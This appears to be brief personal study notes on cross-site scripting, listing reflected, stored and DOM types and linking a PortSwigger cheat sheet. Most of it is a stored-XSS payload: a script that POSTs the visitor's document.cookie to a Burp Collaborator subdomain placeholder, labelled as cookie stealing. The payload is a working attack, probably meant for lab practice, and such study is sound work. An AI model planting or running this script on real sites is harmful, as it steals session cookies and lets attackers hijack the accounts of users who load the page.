# XSS
- Reflected
- Storage
- Dom

# Storage
## cookie stiling via burp coloborator.
``` 
<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
## Cheat sheet
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
